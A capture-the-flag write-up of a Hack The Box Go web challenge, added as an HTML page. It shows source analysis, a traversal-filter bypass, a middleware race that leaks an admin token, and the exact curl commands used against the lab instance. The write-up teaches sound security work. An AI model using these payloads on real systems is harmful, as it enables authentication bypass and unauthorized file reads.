@@ -1,0 +1,627 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CTF writeups</title>
+    <link rel="stylesheet" href="/css/styles.css">
+    <link rel="stylesheet" href="/css/posts.css">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" rel="stylesheet">
+</head>
+<body>
+    <!-- Header will be loaded here -->
+    <div id="header-placeholder"></div>
+    <div class="main-content">
+        <div class="container">
+<h4 id="challenge-details">Challenge details</h4>
+<table>
+<thead>
+<tr>
+<th><strong>Category</strong></th>
+<th>Web</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Challenge Type</strong></td>
+<td>Standalone</td>
+</tr>
+<tr>
+<td><strong>Points</strong></td>
+<td>Dynamic</td>
+</tr>
+<tr>
+<td><strong>Author</strong></td>
+<td>Unknown</td>
+</tr>
+<tr>
+<td><strong>Original Solver</strong></td>
+<td><code>willi34</code></td>
+</tr>
+<tr>
+<td><strong>Difficulty</strong></td>
+<td>5/10</td>
+</tr>
+</tbody>
+</table>
+<h4 id="overview">Overview</h4>
+<p>The application is written in Go and stores notes in the form of files :</p>
+<pre class="codehilite"><code>├── docker-compose.yml
+├── Dockerfile
+├── entrypoint.sh
+├── flag.txt
+├── notes
+│   ├── beatrix_purl_note
+│   ├── chestnut_burble_note
+│   ├── felix_brambletail_note
+│   ├── glimmer_fenn_note
+│   ├── lottie_thimblewhisk_note
+│   ├── marnie_thistlewhip_note
+│   ├── thimble_tock_note
+│   ├── tobin_tinkerbit_note
+│   └── twillie_snowdrop_note
+└── src
+    ├── controllers
+    │   ├── admin_controller.go
+    │   ├── auth_controller.go
+    │   └── note_controller.go
+    ├── go.mod
+    ├── main.go
+    ├── models
+    │   ├── auth.go
+    │   ├── middleware.go
+    │   └── router.go
+    ├── routes.go
+    └── views
+        ├── static
+        │   └── test.txt
+        └── templates
+            ├── admin.html
+            ├── index.html
+            └── login.html
+</code></pre>
+
+<p>The flag we're looking for is inside the <code>/flag.txt</code> inside the container, so we'll need RCE or arbitrary file read to solve this challenge. The web application is first compiled inside the first stage of the container, then executed with the <code>entrypoint.sh</code> entrypoint script.</p>
+<h4 id="source-code-analysis">Source code analysis</h4>
+<p>Here are the main endpoints of the application and their corresponding functions :</p>
+<pre class="codehilite"><code class="language-go">package main
+
+import (
+    &quot;net/http&quot;
+
+    &quot;deadroute/controllers&quot;
+    &quot;deadroute/models&quot;
+)
+
+func SetupRoutes() *models.Router {
+    r := models.MakeRouter()
+
+    // Register middleware
+    r.UseMiddleware(models.LogMiddleware)
+    r.UseMiddleware(models.AntiXSS)
+    r.UseMiddleware(models.CSPProtection)
+
+    // Initialize controllers
+    authController := controllers.NewAuthController()
+    adminController := controllers.NewAdminController()
+    noteController := controllers.NewNoteController()
+
+    // Static files
+    r.ServeStatic(&quot;/static/&quot;, &quot;src/views/static/&quot;)
+
+    // Public routes
+    r.Get(&quot;/&quot;, http.HandlerFunc(noteController.PublicNotesPage))
+    r.Get(&quot;/notes&quot;, http.HandlerFunc(noteController.PublicListNotes))
+    r.Get(&quot;/notes/read&quot;, http.HandlerFunc(noteController.PublicReadNote))
+    r.Get(&quot;/login&quot;, http.HandlerFunc(authController.LoginPage))
+    r.Post(&quot;/login&quot;, http.HandlerFunc(authController.Login))
+    r.Get(&quot;/logout&quot;, http.HandlerFunc(authController.Logout))
+
+    // Protected admin routes
+    r.Get(&quot;/admin&quot;, models.RequireAuth, http.HandlerFunc(adminController.Dashboard))
+    r.Get(&quot;/admin/notes&quot;, models.RequireAuth, http.HandlerFunc(noteController.ListNotes))
+    r.Post(&quot;/admin/notes&quot;, models.RequireAuth, http.HandlerFunc(noteController.WriteNote))
+    r.Get(&quot;/admin/login-token&quot;, models.LocalHostOnly, http.HandlerFunc(adminController.LoginToken))
+
+    // Note operations with ID via query parameter
+    r.Get(&quot;/admin/notes/read&quot;, models.RequireAuth, http.HandlerFunc(noteController.ReadNote))
+    r.Get(&quot;/admin/notes/delete&quot;, models.RequireAuth, http.HandlerFunc(noteController.DeleteNote))
+
+    return r
+}
+</code></pre>
+
+<p>The admin can read, write and delete notes, while normal users can only read them. We can also observe that the read functions for admins and users are different. Here's the <code>publicReadNote</code> function from the <code>controllers/note_controller.go</code> :</p>
+<pre class="codehilite"><code class="language-go">// PublicReadNote reads a note without authentication requirement
+func (c *NoteController) PublicReadNote(w http.ResponseWriter, r *http.Request) {
+    // Extract note ID from query parameter
+    noteID := r.URL.Query().Get(&quot;id&quot;)
+    if noteID == &quot;&quot; {
+        // Try to extract from path as fallback
+        path := r.URL.Path
+        parts := strings.Split(path, &quot;/&quot;)
+        if len(parts) &gt;= 3 {
+            noteID = parts[len(parts)-1]
+        }
+    }
+
+    if noteID == &quot;&quot; {
+        http.Error(w, &quot;Invalid note ID&quot;, http.StatusBadRequest)
+        return
+    }
+
+    // Sanitize noteID to prevent directory traversal
+    if strings.Contains(noteID, &quot;..&quot;) {
+        http.Error(w, &quot;Invalid note ID&quot;, http.StatusBadRequest)
+        return
+    }
+
+    filePath := filepath.Join(c.notesDir, noteID)
+    content, err := ioutil.ReadFile(filePath)
+    if err != nil {
+        http.Error(w, &quot;Note not found&quot;, http.StatusNotFound)
+        return
+    }
+
+    // Parse note file
+    lines := strings.SplitN(string(content), &quot;\n&quot;, 2)
+    title := noteID
+    noteContent := &quot;&quot;
+    if len(lines) &gt; 0 {
+        title = strings.TrimPrefix(lines[0], &quot;TITLE: &quot;)
+        if len(lines) &gt; 1 {
+            noteContent = lines[1]
+            }
+    }
+
+    // Get file modification time
+    fileInfo, err := os.Stat(filePath)
+    date := time.Now().Format(&quot;2006-01-02 15:04:05&quot;)
+    if err == nil {
+        date = fileInfo.ModTime().Format(&quot;2006-01-02 15:04:05&quot;)
+    }
+
+    note := Note{
+        ID:      noteID,
+        Title:   title,
+        Content: noteContent,
+        Date:    date,
+    }
+
+    w.Header().Set(&quot;Content-Type&quot;, &quot;application/json&quot;)
+    json.NewEncoder(w).Encode(note)
+}
+</code></pre>
+
+<p>Each note will be given an ID that will represent the filename the note content is stored in. The function will take a parameter that contains one of those IDs, and then append that to the <code>/app/notes</code> directory as a filepath to read from. It correctly check for instances of <code>..</code> to make sure the filename cannot reference something that is not within that directory, stopping us from reading the flag we know is at <code>/flag.txt</code> two directories back.</p>
+<p>And now here's the admin function responsible for note reading for comparison :</p>
+<pre class="codehilite"><code class="language-go">func (c *NoteController) ReadNote(w http.ResponseWriter, r *http.Request) {
+    if !models.CheckAuth(w, r) {
+        return
+    }
+    // Extract note ID from query parameter
+    noteID := r.URL.Query().Get(&quot;id&quot;)
+    if noteID == &quot;&quot; {
+        // Try to extract from path as fallback
+        path := r.URL.Path
+        parts := strings.Split(path, &quot;/&quot;)
+        if len(parts) &gt;= 4 {
+            noteID = parts[len(parts)-1]
+            }
+    }
+
+    if noteID == &quot;&quot; {
+        http.Error(w, &quot;Invalid note ID&quot;, http.StatusBadRequest)
+        return
+    }
+
+    // Sanitize noteID to prevent directory traversal
+    noteID = strings.ReplaceAll(noteID, &quot;../&quot;, &quot;&quot;)
+
+    filePath := filepath.Join(c.notesDir, noteID)
+    content, err := ioutil.ReadFile(filePath)
+    if err != nil {
+        http.Error(w, &quot;Note not found&quot;, http.StatusNotFound)
+        return
+    }
+
+    // Parse note file
+    lines := strings.SplitN(string(content), &quot;\n&quot;, 2)
+    title := noteID
+    noteContent := &quot;&quot;
+    if len(lines) &gt; 0 {
+        title = strings.TrimPrefix(lines[0], &quot;TITLE: &quot;)
+        if len(lines) &gt; 1 {
+            noteContent = lines[1]
+            }
+    }
+
+    note := Note{
+        ID:      noteID,
+        Title:   title,
+        Content: noteContent,
+        Date:    time.Now().Format(&quot;2006-01-02 15:04:05&quot;),
+    }
+
+    w.Header().Set(&quot;Content-Type&quot;, &quot;application/json&quot;)
+    json.NewEncoder(w).Encode(note)
+}
+</code></pre>
+
+<p>The obvious difference is how path traversal is detected. The admin's <code>readNote</code> function will only strip instances of <code>../</code> in the note as validation. The problem is that the <code>ReplaceAll</code> function from the <code>strings</code> package is not recursive, meaning that the note ID <code>....//....//flag.txt</code> will get stripped into <code>../../flag.txt</code>, resulting in path traversal and the challenge being solved.</p>
+<p>So how do we gain admin access? Each admin endpoint is protected by middleware from the <code>models/middleware.go</code> file :</p>
+<pre class="codehilite"><code class="language-go">// Comes to this 
+func CheckAuth(w http.ResponseWriter, r *http.Request) bool {
+    cookie, err := r.Cookie(&quot;santa_auth&quot;)
+    if err != nil || cookie.Value == &quot;&quot; || !VerifyAuthToken(cookie.Value) {
+        http.Redirect(w, r, &quot;/login&quot;, http.StatusSeeOther)
+        return false
+    }
+    return true
+}
+
+// We need this check to go through to get the flag
+func RequireAuth(next http.Handler) http.Handler {
+    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+        if !CheckAuth(w, r) {
+            return
+        }
+        next.ServeHTTP(w, r)
+    })
+}
+</code></pre>
+
+<p>Authentication is checked through a cookie called <code>santa_auth</code> with the <code>VerifyAuthToken</code> function from the <code>models/auth.go</code> file :</p>
+<pre class="codehilite"><code class="language-go">package models
+
+import (
+    &quot;crypto/hmac&quot;
+    &quot;crypto/sha256&quot;
+    &quot;crypto/subtle&quot;
+    &quot;encoding/hex&quot;
+    &quot;os&quot;
+)
+
+func getPassword() string {
+    expectedPassword := os.Getenv(&quot;ADMIN_PASSWORD&quot;)
+    if expectedPassword == &quot;&quot; {
+        panic(&quot;ADMIN_PASSWORD is not set&quot;)
+    }
+    return expectedPassword
+}
+
+func CheckPassword(password string) bool {
+    expectedPassword := getPassword()
+    return subtle.ConstantTimeCompare([]byte(password), []byte(expectedPassword)) == 1
+}
+
+
+// GenerateAuthToken creates a secure HMAC token from the password
+func GenerateAuthToken() string {
+    password := getPassword()
+    secret := os.Getenv(&quot;AUTH_SECRET&quot;)
+    if secret == &quot;&quot; {
+        panic(&quot;AUTH_SECRET is not set&quot;)
+    }
+
+    mac := hmac.New(sha256.New, []byte(secret))
+    mac.Write([]byte(password))
+    return hex.EncodeToString(mac.Sum(nil))
+}
+
+// VerifyAuthToken verifies that the provided token matches the expected password hash
+func VerifyAuthToken(token string) bool {
+    expectedToken := GenerateAuthToken()
+    return subtle.ConstantTimeCompare([]byte(token), []byte(expectedToken)) == 1
+}
+</code></pre>
+
+<p>Essentially, the cookie value is expected to be the admin's password hashed with HMAC-SHA256 using the environment variable <code>AUTH_SECRET</code> as the secret key. To prevent any sort of time leak, constant time comparison functions are used to compare our cookie and the expected value. </p>
+<p>Luckily for us, the <code>/admin/login-token</code> endpoint (found in <code>controllers/admin_controller.go</code>) generates and returns the authentication token we need to become admin :</p>
+<pre class="codehilite"><code class="language-go">package controllers
+
+import (
+    &quot;html/template&quot;
+    &quot;net/http&quot;
+
+    &quot;deadroute/models&quot;
+)
+
+type AdminController struct{}
+
+func NewAdminController() *AdminController {
+    return &amp;AdminController{}
+}
+
+func (c *AdminController) Dashboard(w http.ResponseWriter, r *http.Request) {
+    tmpl, err := template.ParseFiles(&quot;src/views/templates/admin.html&quot;)
+    if err != nil {
+        http.Error(w, &quot;Error loading template&quot;, http.StatusInternalServerError)
+        return
+    }
+    w.Header().Set(&quot;Content-Type&quot;, &quot;text/html; charset=utf-8&quot;)
+    tmpl.Execute(w, nil)
+}
+
+// 
+func (c *AdminController) LoginToken(w http.ResponseWriter, r *http.Request) {
+    token := models.GenerateAuthToken()
+    w.Header().Set(&quot;Content-Type&quot;, &quot;text/plain&quot;)
+    w.Write([]byte(token))
+}
+</code></pre>
+
+<p>However, this endpoint is protected by another piece of middleware from <code>models/middleware.go</code> that verifies that the request is coming from localhost :</p>
+<pre class="codehilite"><code class="language-go">func LocalHostOnly(next http.Handler) http.Handler {
+    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+        // Extract IP from RemoteAddr (format: &quot;IP:port&quot;)
+        host, _, err := net.SplitHostPort(r.RemoteAddr)
+        if err != nil {
+            // If SplitHostPort fails, try using RemoteAddr directly
+            host = r.RemoteAddr
+        }
+
+        // Check if request is from localhost
+        // Handle both IPv4 (127.0.0.1) and IPv6 (::1) cases
+        if host != &quot;127.0.0.1&quot; &amp;&amp; host != &quot;::1&quot; &amp;&amp; host != &quot;localhost&quot; {
+            http.Error(w, &quot;Forbidden&quot;, http.StatusForbidden)
+            return
+        }
+        next.ServeHTTP(w, r)
+    })
+}
+</code></pre>
+
+<p>As the source IP address coming from the <code>r.RemoteAddr</code> field in the HTTP request is taken straight from the TCP connection, it cannot be spoofed. It's also worth noting that several other seemingly unrelevant middleware functions are present within <code>models/middleware.go</code> :</p>
+<pre class="codehilite"><code class="language-go">func LogMiddleware(next http.Handler) http.Handler {
+    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+        start := time.Now()
+        next.ServeHTTP(w, r)
+        log.Printf(&quot;%s %s %v&quot;, r.Method, r.URL.Path, time.Since(start))
+    })
+}
+
+func AntiXSS(next http.Handler) http.Handler {
+    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+        w.Header().Set(&quot;X-XSS-Protection&quot;, &quot;1; mode=block&quot;)
+        next.ServeHTTP(w, r)
+    })
+}
+
+func CSPProtection(next http.Handler) http.Handler {
+    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+        w.Header().Set(&quot;Content-Security-Policy&quot;, &quot;default-src 'self' cdn.tailwindcss.com fonts.googleapis.com; script-src 'self' 'unsafe-inline' https://cdn.tailwindcss.com; style-src 'self' 'unsafe-inline' https://cdn.tailwindcss.com; img-src 'self' data:; font-src 'self' data: https://fonts.gstatic.com; frame-src 'self'; media-src 'self'; object-src 'none'; form-action 'self'; base-uri 'self';&quot;)
+        next.ServeHTTP(w, r)
+    })
+}
+</code></pre>
+
+<h4 id="bypassing-localhost-check">Bypassing localhost check</h4>
+<p>So how do we bypass this check if all we can do is read notes? I tought about request smuggling, then realized that the app had a custom router implementation to handle path-to-handler links in <code>models/router.go</code> :</p>
+<pre class="codehilite"><code class="language-go">package models
+
+import (
+    &quot;net/http&quot;
+    &quot;strings&quot;
+    &quot;sync&quot;
+)
+
+type Handler interface{}
+
+type Middleware = func(next http.Handler) http.Handler
+
+type Router struct {
+    mu     sync.RWMutex
+    routes map[string]http.HandlerFunc // key format: &quot;METHOD:path&quot;
+    mws    []Middleware
+}
+
+func MakeRouter() *Router {
+    return &amp;Router{routes: make(map[string]http.HandlerFunc)}
+}
+
+func (r *Router) UseMiddleware(mw Middleware) {
+    r.mu.Lock()
+    r.mws = append(r.mws, mw)
+    r.mu.Unlock()
+}
+
+func (r *Router) ServeHTTP(w http.ResponseWriter, req *http.Request) {
+    r.mu.RLock()
+    // Check for static files first
+    if strings.HasPrefix(req.URL.Path, &quot;/static/&quot;) {
+        fs := http.FileServer(http.Dir(&quot;src/views/static/&quot;))
+        http.StripPrefix(&quot;/static/&quot;, fs).ServeHTTP(w, req)
+        r.mu.RUnlock()
+        return
+    }
+
+    // Create route key with method and path
+    routeKey := req.Method + &quot;:&quot; + req.URL.Path
+    h, ok := r.routes[routeKey]
+    if !ok {
+        // Try without method for backward compatibility
+        h, ok = r.routes[req.URL.Path]
+    }
+    r.mu.RUnlock()
+    if ok {
+        h.ServeHTTP(w, req)
+        return
+    }
+    http.NotFound(w, req)
+}
+
+func (r *Router) ServeStatic(pattern, dir string) {
+    // Static files are handled in ServeHTTP
+    // This method exists for API compatibility
+}
+
+func (r *Router) Handle(pattern string, handlers []Handler) {
+    r.mu.Lock()
+    r.routes[pattern] = func(w http.ResponseWriter, req *http.Request) {
+        r.mu.RLock()
+        mws := r.mws
+        r.mu.RUnlock()
+        for _, h := range handlers {
+            mws = append(mws, getMWFromHandler(h))
+        }
+        h := http.Handler(http.HandlerFunc(func(http.ResponseWriter, *http.Request) {}))
+        for i := len(mws) - 1; i &gt;= 0; i-- {
+            h = mws[i](h)
+        }
+        h.ServeHTTP(w, req)
+    }
+    r.mu.Unlock()
+}
+
+func (r *Router) Get(pattern string, h ...Handler) {
+    r.mu.Lock()
+    routeKey := &quot;GET:&quot; + pattern
+    r.routes[routeKey] = func(w http.ResponseWriter, req *http.Request) {
+        if req.Method != http.MethodGet {
+            http.Error(w, &quot;Method not allowed&quot;, http.StatusMethodNotAllowed)
+            return
+        }
+        r.mu.RLock()
+        mws := r.mws
+        r.mu.RUnlock()
+        for _, handler := range h {
+            mws = append(mws, getMWFromHandler(handler))
+        }
+        handler := http.Handler(http.HandlerFunc(func(http.ResponseWriter, *http.Request) {}))
+        for i := len(mws) - 1; i &gt;= 0; i-- {
+            handler = mws[i](handler)
+        }
+        handler.ServeHTTP(w, req)
+    }
+    r.mu.Unlock()
+}
+
+func (r *Router) Post(pattern string, h ...Handler) {
+    r.mu.Lock()
+    routeKey := &quot;POST:&quot; + pattern
+    r.routes[routeKey] = func(w http.ResponseWriter, req *http.Request) {
+        if req.Method != http.MethodPost {
+            http.Error(w, &quot;Method not allowed&quot;, http.StatusMethodNotAllowed)
+            return
+        }
+        r.mu.RLock()
+        mws := r.mws
+        r.mu.RUnlock()
+        for _, handler := range h {
+            mws = append(mws, getMWFromHandler(handler))
+        }
+        handler := http.Handler(http.HandlerFunc(func(http.ResponseWriter, *http.Request) {}))
+        for i := len(mws) - 1; i &gt;= 0; i-- {
+            handler = mws[i](handler)
+        }
+        handler.ServeHTTP(w, req)
+    }
+    r.mu.Unlock()
+}
+
+func getMWFromHandler(h Handler) Middleware {
+    if mw, ok := h.(func(http.Handler) http.Handler); ok {
+        return mw
+    }
+    return func(next http.Handler) http.Handler {
+        return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+            h.(http.Handler).ServeHTTP(w, r)
+            next.ServeHTTP(w, r)
+        })
+    }
+}
+</code></pre>
+
+<p>Maybe there's a problem in how this is implemented that could allow us to sneak a request through, or maybe just to ignore some middleware? We'll focus on the handling of <code>GET</code> requests, since that's the type of request we'll need to send to get an auth token :</p>
+<pre class="codehilite"><code class="language-go">func (r *Router) Get(pattern string, h ...Handler) {
+    r.mu.Lock()
+    routeKey := &quot;GET:&quot; + pattern
+    r.routes[routeKey] = func(w http.ResponseWriter, req *http.Request) {
+        if req.Method != http.MethodGet {
+            http.Error(w, &quot;Method not allowed&quot;, http.StatusMethodNotAllowed)
+            return
+        }
+        r.mu.RLock()
+        mws := r.mws
+        r.mu.RUnlock()
+        for _, handler := range h {
+            mws = append(mws, getMWFromHandler(handler))
+        }
+        handler := http.Handler(http.HandlerFunc(func(http.ResponseWriter, *http.Request) {}))
+        for i := len(mws) - 1; i &gt;= 0; i-- {
+            handler = mws[i](handler)
+        }
+        handler.ServeHTTP(w, req)
+    }
+    r.mu.Unlock()
+}
+</code></pre>
+
+<p>Once a <code>GET</code> request is received, the app does the following :</p>
+<ol>
+<li>Uses a slice to store the global handler functions. This gets assigned to the <code>mws</code> variable</li>
+<li>The specific handlers for the endpoint are appended to that slice</li>
+<li>The slice is looped in reverse order to give execution order to the handlers</li>
+<li>Start the <code>ServeHTTP</code> function, which starts the handler execution chain</li>
+</ol>
+<p>If we look inside the <code>routes.go</code> file, we can see that the three unrelevant middleware pieces are already inserted into this slice when the app is initialized (<code>router.go</code>) :</p>
+<pre class="codehilite"><code class="language-go">r.UseMiddleware(models.LogMiddleware)
+r.UseMiddleware(models.AntiXSS)
+r.UseMiddleware(models.CSPProtection)
+</code></pre>
+
+<p>Snippet from the custom router :</p>
+<pre class="codehilite"><code class="language-go">func (r *Router) UseMiddleware(mw Middleware) {
+    r.mu.Lock()
+    r.mws = append(r.mws, mw)
+    r.mu.Unlock()
+}
+</code></pre>
+
+<p>Based on the endpoint we want to visit, the app will append the required middleware function associated with the endpoint to the slice. That way, the router knows which functions to execute in what order for what endpoints. For example, if we visited the <code>/admin/login-token</code> endpoint, the slice would look like this and the corresponding functions would be executed in reverse order :<br />
+<code>CSPProtection -&gt; AntiXSS -&gt; LogMiddleware -&gt; LocalHostOnly</code></p>
+<p>Things get interesting when you realize that a slice in Go just points to an array under the hood. Copying this slice (with <code>mws := r.mws</code>) doesn't create a new independant array, it just keeps pointing to the same underlying one. This means that all requests are modifying the same array that handles which middleware functions to run. This smells like a race condition.</p>
+<p>The handler specific to the endpoint will get added to the free index 3 of the slice as a request is made. The idea is to attempt to send 2 requests at the same time, one requiering the localhost handler and one using another (like one used for public endpoints). Since both occurences would try and write to the free index 3, the second request could overwrite the handler value on index 3 before it starts the execution chain. This would mean the router would execute a harmless handler instead of the one that's supposed to verify the request is coming from localhost.  </p>
+<p>I tried getting Gemini AI to write me a script to do this, but it actually schooled me with this much simpler solution that uses <code>xargs</code> to send requests in parallel which I found pretty cool :</p>
+<pre class="codehilite"><code>┌──(kali㉿kali)-[~/CTF/htb/challenge]
+└─$ seq 1 200 | xargs -I{} -P 50 curl -s &quot;http://154.57.164.80:32619/admin/login-token&quot; &amp; seq 1 200 | xargs -I{} -P 50 curl -s &quot;http://154.57.164.80:32619&quot; -o /dev/null
+[1] 34173 34174
+Forbidden
+Forbidden
+Forbidden
+Forbidden
+Forbidden
+[...]
+        function escapeHtml(text) {
+            const div = document.createElement('div');
+            div.textContent = text;
+            return div.innerHTML;
+        }
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;dce2149ed61d7c70a44c1d8967eb9cafdd9f4144e49580986ca2db6429f38aaeForbidden
+Forbidden
+Forbidden
+Forbidden
+[...]
+</code></pre>
+
+<p>Note : I had to tweak this payload until I had the right number of simultaneous requests before achieving the race. I initially tried with 100 requests in each, but that number didn't seem to trigger the race at all.</p>
+<p>Once we pick up the authentication token, we can use it as a cookie and exploit the path traversal to read the flag using the admin's vulnerable read note endpoint :</p>
+<pre class="codehilite"><code>┌──(kali㉿kali)-[~/CTF/htb/challenge]
+└─$ curl -H &quot;Cookie: santa_auth=dce2149ed61d7c70a44c1d8967eb9cafdd9f4144e49580986ca2db6429f38aae&quot; 'http://154.57.164.80:32619/admin/notes/read?id=....//....//flag.txt'
+
+{&quot;id&quot;:&quot;../../flag.txt&quot;,&quot;title&quot;:&quot;HTB{f1nd_th3_d34d_r0ute_after_w1nning_the_rac3_7bd678a8d68a0749d635b7b8f8c3bf46}&quot;,&quot;content&quot;:&quot;&quot;,&quot;date&quot;:&quot;2025-12-20 00:17:53&quot;}
+</code></pre>
+
+<p>Flag : <code>HTB{f1nd_th3_d34d_r0ute_after_w1nning_the_rac3_7bd678a8d68a0749d635b7b8f8c3bf46}</code></p>
+    <!-- Footer will be loaded here -->
+        </div>
+    </div>
+    <div id="footer-placeholder"></div>
+    <script src="/js/script.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-go.min.js"></script>
+</body>
+</html>
